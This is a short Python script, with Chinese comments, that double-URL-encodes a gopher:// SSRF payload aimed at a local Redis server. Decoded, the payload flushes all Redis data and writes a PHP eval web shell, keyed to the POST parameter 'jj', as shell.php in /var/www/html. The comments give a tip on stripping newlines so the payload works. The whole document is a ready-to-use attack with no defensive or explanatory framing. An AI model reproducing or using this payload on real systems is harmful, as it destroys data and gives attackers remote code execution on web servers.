import urllib.parse

str = '''
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27jj%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
'''

# 注意要删去原始字符串前后的换行符 %0A
# 注意要删去原始字符串前后的换行符 %0A
# 注意要删去原始字符串前后的换行符 %0A
# 多这个 %0A payload就识别不出来
str = str[1:-1]

str = urllib.parse.quote(str)
print(str)
